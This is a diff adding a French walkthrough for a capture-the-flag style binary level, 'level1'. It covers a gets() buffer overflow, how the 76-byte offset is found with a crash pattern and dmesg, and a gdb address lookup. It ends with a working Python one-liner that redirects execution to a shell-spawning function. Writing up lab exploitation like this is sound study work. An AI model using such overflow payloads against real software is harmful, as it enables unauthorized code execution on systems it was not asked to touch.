@@ -1,0 +1,24 @@
+# Walkthrough — level1
+
+## 1) Contexte & objectifs
+- Objectif : obtenir le shell en redirigeant l’exécution vers `run`.
+- Fichier binaire : `level1`.
+- Contexte : le programme lit une entrée utilisateur avec `gets`.
+
+## 2) Analyse & vulnérabilité
+- Analyse statique :
+    - `gets` lit dans un buffer de 76 octets sans contrôle de taille.
+- Analyse dynamique :
+	- Crash avec un motif (`AAAABBBB[...]FFFF`) permet de repérer l’offset de l’EIP.
+	- `dmesg` indique `0x42424242` (les `B`), ce qui confirme l’offset à 76.
+- Vulnérabilité : overflow permettant d’écraser l’adresse de retour.
+
+## 3) Exploitation & flag
+- Étapes :
+	- Remplir 76 octets puis écrire l’adresse de `run` (`0x8048444`).
+	- Lancer le binaire avec le payload et récupérer le mot de passe du niveau suivant.
+- Commandes utilisées :
+	- `./level1` avec un motif pour trouver l’offset.
+	- `dmesg | grep segfault` pour confirmer `0x42424242`.
+	- `gdb ./level1` puis `info functions` et `p run` pour l’adresse.
+	- `(python -c "print 'A'*76 + '\x44\x84\x04\x08'"; cat) | ./level1`.
